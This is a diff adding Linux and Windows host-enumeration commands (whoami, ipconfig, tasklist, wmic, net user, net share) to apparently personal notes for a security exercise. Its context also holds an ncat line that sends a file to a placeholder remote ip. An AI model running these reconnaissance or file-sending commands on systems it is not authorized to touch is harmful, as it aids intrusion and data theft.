@@ -42,7 +42,7 @@ ncat --ssl <ip> <port> < <file>
 dont touch 10.10 or 10.0
 
 once i get on box
-
+L I N U X 
 whoami
 hostname
 ip a / ifconfig
@@ -69,3 +69,19 @@ find / -type f -iname "log" 2>/dev/null
 find / -type f -iname "*.log" -exec md5sum {} \; 2>/dev/null
 find hidden directiories/files (change type) - find / -type d -name ".*" 2/dev/null
 ls -latr /etc/cron*/
+===========================================================================
+
+W I N D O W S
+
+whoami
+hostname
+ipconfig /all
+query user
+netstat 
+tasklist /v
+wmic process get Name,ExecutablePath,Processid,ParentProcessid
+arp -a
+net user
+net localgroup 
+net share
+sc query or search services in search bar
